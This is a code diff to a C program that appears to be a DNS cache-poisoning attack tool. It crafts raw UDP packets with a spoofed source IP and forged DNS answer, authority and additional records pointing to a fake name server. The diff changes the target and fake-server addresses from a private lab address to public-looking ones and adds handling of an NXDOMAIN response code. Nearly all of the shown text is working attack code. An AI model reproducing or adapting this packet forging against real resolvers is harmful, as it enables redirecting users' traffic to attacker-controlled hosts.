@@ -144,7 +144,7 @@ int main ( int argc , char *argv[] )
 	// start up query socket 
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(port);
-	server_addr.sin_addr.s_addr = inet_addr("192.168.58.128");//addr->s_addr;
+	server_addr.sin_addr.s_addr = inet_addr("140.114.63.1");//addr->s_addr;
 	bzero(&(server_addr.sin_zero),8);
 	clinet_addr.sin_family = AF_INET;
 	clinet_addr.sin_port = htons(port);
@@ -188,7 +188,7 @@ int main ( int argc , char *argv[] )
 	*(ans) 	   = 0xc0;
 	*(ans + 1) = q - attack;
 	ans_l = add_ans_header( ans + 2 , 4 ) + 2;
-	fack_dns_ip = inet_addr("140.114.63.1");
+	fack_dns_ip = inet_addr("140.114.64.1");
 	strncpy( ans+ans_l , (unsigned char*)&fack_dns_ip , 4 );
 	ans_l += 4;
 	
@@ -216,7 +216,7 @@ int main ( int argc , char *argv[] )
 	base_reg = aut - attack + 2 + sizeof(struct Quset) + sizeof(struct RR); // NS record offset address
 	add[0] = 0xc0;
 	add[1] = base_reg;
-	fack_dns_ip = inet_addr("140.114.63.1");
+	fack_dns_ip = inet_addr("140.114.64.1");
 	add_l = add_add_header( add+2 , 4 , (unsigned char*)&fack_dns_ip ) + 2;
 	*(add + add_l    ) = 0xc0;
 	base_reg += 2 + sizeof(struct Quset) + sizeof(struct RR) + strlen(NS_name[0]) + 3;
@@ -247,7 +247,7 @@ int main ( int argc , char *argv[] )
 	iph->protocol  = 17;
 	udph->len      = htons(sizeof(struct udp_header) + send_len);
 	iph->saddr      = inet_addr("18.72.0.3");
-	iph->daddr      = inet_addr("192.168.58.128");
+	iph->daddr      = inet_addr("140.114.63.1");
 	iph->check      = csum((unsigned short *)iph, sizeof(struct ip_header));
 	udph->check  = 0;	// UDP header
 	udph->source = htons(53);
@@ -313,7 +313,7 @@ int main ( int argc , char *argv[] )
 			}
 
 		}
-		else if( dns_h->opt == htons(0x8183) )
+		else if( dns_h->opt == htons(0x8183) || dns_h->opt == htons(0x8583) )
 		{
 			printf("No such name\n");
 		}
